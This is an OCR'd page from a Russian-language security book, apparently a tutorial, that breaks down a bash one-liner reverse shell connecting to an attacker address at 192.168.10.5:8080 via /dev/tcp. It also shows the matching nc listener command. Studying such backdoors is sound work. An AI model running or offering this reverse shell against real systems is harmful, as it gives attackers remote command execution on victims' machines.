---
source_image: page_236.png
page_number: 236
model: model-run-olm-ocr
prompt_type: olmocr_technical
processing_time: 9.99
tokens: 7448
characters: 1653
timestamp: 2025-12-23T23:10:44.467316
finish_reason: stop
---

Хотя это только одна строка, здесь много чего происходит, поэтому давайте с этим разберемся.

/bin/bash -i

Данная строка вызывает новый экземпляр bash и запускает его в интерактивном режиме.

< /dev/tcp/192.168.10.5/8080

Это создает TCP-соединение с системой злоумышленника по адресу 192.168.10.5, порт 8080 и перенаправляет его в качестве ввода в новый экземпляр bash. Замените здесь IP-адрес и порт IP-адресом и портом системы злоумышленника.

1>&0  2>&0

Здесь происходит перенаправление стандартного вывода (stdout) (файловый дескриптор 1) и стандартного потока ошибок (stderr) (дескриптор 2) в стандартный ввод (stdin) (дескриптор файла 0). В этом случае stdin сопоставляется с только что созданным TCP-соединением.

Важен порядок перенаправления. Сначала нужно открыть сокет, а затем перенаправить файловые дескрипторы для использования сокета.

В системе злоумышленника необходимо иметь список портов сервера, через которые можно установить соединение с целью. Для этого вы можете использовать nc:

$ nc -l -v -p 8080

listening on [any] 8080

Убедитесь, что вы установили прослушиватель nc на тот же номер порта, который планируете указать из бэкдора. При подключении бэкдора может показаться, что прослушиватель nc закончил работу, так как вы видите приглашение оболочки. На самом деле nc остается открытым, и, кроме этого, создается новая оболочка. Все команды, введенные в эту новую оболочку, будут выполняться в удаленной системе.

Однострочный бэкдор bash прост в обращении и не выполняет никакого шифрования сетевого подключения. Сетевые защитники или другие программы, наблюдающие за соединением, смогут прочитать его как обычный текст.